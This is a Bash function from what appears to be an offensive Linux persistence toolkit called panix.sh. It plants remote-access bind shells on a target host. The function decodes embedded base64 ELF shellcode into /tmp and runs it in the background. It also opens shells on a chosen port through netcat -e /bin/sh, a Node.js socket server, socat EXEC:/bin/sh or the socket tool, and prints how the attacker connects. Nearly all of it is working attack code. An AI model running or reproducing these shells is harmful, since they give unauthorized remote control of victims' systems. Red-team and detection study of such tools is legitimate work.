setup_bind_shell() {
	local default=0
	local custom=0
	local shellcode=0
	local lolbin=0
	local architecture=""
	local binary=""
	local nc=0
	local node=0
	local socat=0
	local socket=0

	usage_bind_shell() {
		echo "Usage: ./panix.sh --bind-shell [OPTIONS]"
		echo "--examples                                Display command examples"
		echo "--default                                 Use default bind shell settings"
		echo "  --shellcode                               Use shellcode for bind shell"
		echo "    --architecture <arch>                     Specify architecture (x86 or x64)"
		echo "  --lolbin                                Use LOLBIN for bind shell"
		echo "    --nc | --node | --socat | --socket      Specify LOLBIN to use"
		echo "    --port <port>                             Specify port to bind shell to"
		echo "--custom                                  Use custom bind shell binary"
		echo "  --binary <binary>                         Specify the path to the custom binary"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--shellcode )
				shellcode=1
				;;
			--lolbin )
				lolbin=1
				;;
			--architecture )
				shift
				architecture=$1
				;;
			--binary )
				shift
				binary=$1
				;;
			--nc )
				nc=1
				;;
			--node )
				node=1
				;;
			--socat )
				socat=1
				;;
			--socket )
				socket=1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --bind-shell --default --shellcode --architecture x86"
				echo "sudo ./panix.sh --bind-shell --default --lolbin --nc --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --bind-shell --custom --binary \"/tmp/bindshell\""
				exit 0
				;;
			--help|-h)
				usage_bind_shell
				exit 0
				;;
			* )
				echo "Invalid option for --bind-shell: $1"
				echo "Try './panix.sh --bind-shell --help' for more information."
				exit 1
		esac
		shift
	done

	# Validate argument combinations
	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --bind-shell --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ $shellcode -eq 0 && $lolbin -eq 0 ]]; then
			echo "Error: --default requires either --shellcode or --lolbin."
			echo "Try './panix.sh --bind-shell --help' for more information."
			exit 1
		fi

		if [[ $shellcode -eq 1 ]]; then
			if [[ -z $architecture ]]; then
				echo "Error: --architecture (x64/x86) must be specified when using --shellcode."
				echo "Try './panix.sh --bind-shell --help' for more information."
				exit 1
			fi

			case $architecture in
				x86 )
					echo "[+] Using shellcode for x86 architecture..."
					echo -n "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiiAAAA8AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2AW15SaAIAIylqEFFQieFqZljNgIlBBLMEsGbNgEOwZs2Ak1lqP1jNgEl5+GgvL3NoaC9iaW6J41BTieGwC82A" | base64 -d > /tmp/bd86
					chmod +x /tmp/bd86
					/tmp/bd86 &
					echo "[+] Bind shell binary /tmp/bd86 created and executed in the background."
					;;
				x64 )
					echo "[+] Using shellcode for x64 architecture..."
					echo -n "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgAjKUiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=" | base64 -d > /tmp/bd64
					chmod +x /tmp/bd64
					/tmp/bd64 &
					echo "[+] Bind shell binary /tmp/bd64 created and executed in the background."
					;;
				* )
					echo "Error: Invalid architecture specified. Use one of x86 or x64."
					echo "Try './panix.sh --bind-shell --help' for more information."
					exit 1
			esac
			echo "[+] Bind shell persistence established!"
			echo "[+] The bind shell is listening on port 9001."
			echo "[+] To interact with it from a different system, use: nc -nv <IP> 9001"
		fi

		if [[ $lolbin -eq 1 ]]; then
			if [[ $nc -eq 0 && $node -eq 0 && $socat -eq 0 && $socket -eq 0 ]]; then
				echo "Error: --lolbin requires one of --nc, --node, --socat, or --socket."
				echo "Try './panix.sh --bind-shell --help' for more information."
				exit 1
			fi

			if [[ -z $port ]]; then
				echo "Error: --port must be specified when using --lolbin."
				echo "Try './panix.sh --bind-shell --help' for more information."
				exit 1
			fi

			# Ref: https://gtfobins.github.io/gtfobins/nc/#bind-shell
			if [[ $nc -eq 1 ]]; then
				echo "[+] Checking for Netcat (nc.traditional) on the system..."
				if command -v nc.traditional &>/dev/null; then
					echo "[+] Netcat (nc.traditional) is available. Starting bind shell on port $port..."
					nc.traditional -l -p "$port" -e /bin/sh &
					echo "[+] Netcat bind shell running in the background on port $port."
					echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
					echo "    nc <target.com> $port"
					echo "    telnet <target.com> $port"
				elif command -v nc &>/dev/null; then
					echo "[+] Checking if Netcat (nc) supports the -e option..."
					if nc -h 2>&1 | grep -q -- "-e"; then
						echo "[+] Netcat (nc) supports -e. Starting bind shell on port $port..."
						nc -l -p "$port" -e /bin/sh &
						echo "[+] Netcat bind shell running in the background on port $port."
						echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
						echo "    nc <target.com> $port"
						echo "    telnet <target.com> $port"
					else
						echo "[-] Netcat (nc) does not support the -e option. Cannot use Netcat for bind shell."
					fi
				else
					echo "[-] Neither nc.traditional nor nc with -e option is available. Cannot use Netcat for bind shell."
				fi
			fi

			# https://gtfobins.github.io/gtfobins/node/#bind-shell
			if [[ $node -eq 1 ]]; then
				echo "[+] Checking for Node.js on the system..."
				if command -v node &>/dev/null; then
					echo "[+] Node.js is available. Starting bind shell on port $port..."

					# Start the bind shell using Node.js
					node -e "
						const sh = require('child_process').spawn('/bin/sh');
						require('net').createServer(client => {
							client.pipe(sh.stdin);
							sh.stdout.pipe(client);
							sh.stderr.pipe(client);
						}).listen($port);
					" &

					if [[ $? -eq 0 ]]; then
						echo "[+] Node.js bind shell running in the background on port $port."
						echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
						echo "    nc <target.com> $port"
						echo "    telnet <target.com> $port"
					else
						echo "[-] Failed to start Node.js bind shell."
					fi
				else
					echo "[-] Node.js is not available on this system. Cannot use Node.js for bind shell."
				fi
			fi
			
			# Ref: https://gtfobins.github.io/gtfobins/socat/#bind-shell
			if [[ $socat -eq 1 ]]; then
				echo "[+] Checking for Socat on the system..."
				if command -v socat &>/dev/null; then
					echo "[+] Socat is available. Starting bind shell on port $port..."
					socat TCP-LISTEN:$port,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane &
					echo "[+] Socat bind shell running in the background on port $port."
					echo "[+] To connect to the shell from the attacker box, run:"
					echo "    socat FILE:\`tty\`,raw,echo=0 TCP:<target.com>:$port"
				else
					echo "[-] Socat is not available on this system. Cannot use Socat for bind shell."
				fi
			fi

			# Ref: https://gtfobins.github.io/gtfobins/socket/#bind-shell
			if [[ $socket -eq 1 ]]; then
				echo "[+] Checking for Socket on the system..."
				if command -v socket &>/dev/null; then
					echo "[+] Socket is available. Starting bind shell on port $port..."
					setsid nohup socket -svp '/bin/sh -i' $port &
					echo "[+] Socket bind shell running in the background on port $port."
					echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
					echo "    nc <target.com> $port"
					echo "    telnet <target.com> $port"
				else
					echo "[-] Socket is not available on this system. Cannot use Socket for bind shell."
				fi
			fi
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $binary ]]; then
			echo "Error: --binary must be specified when using --custom."
			echo "Try './panix.sh --bind-shell --help' for more information."
			exit 1
		fi

		if [[ ! -f $binary ]]; then
			echo "Error: Specified binary does not exist: $binary."
			echo "Try './panix.sh --bind-shell --help' for more information."
			exit 1
		fi

		chmod +x $binary
		$binary &
		echo "[+] Custom binary $binary is executed and running in the background."
		echo "[+] Bind shell persistence established!"
	else
		echo "Error: Either --default or --custom must be specified for --bind-shell."
		echo "Try './panix.sh --bind-shell --help' for more information."
		exit 1
	fi
}
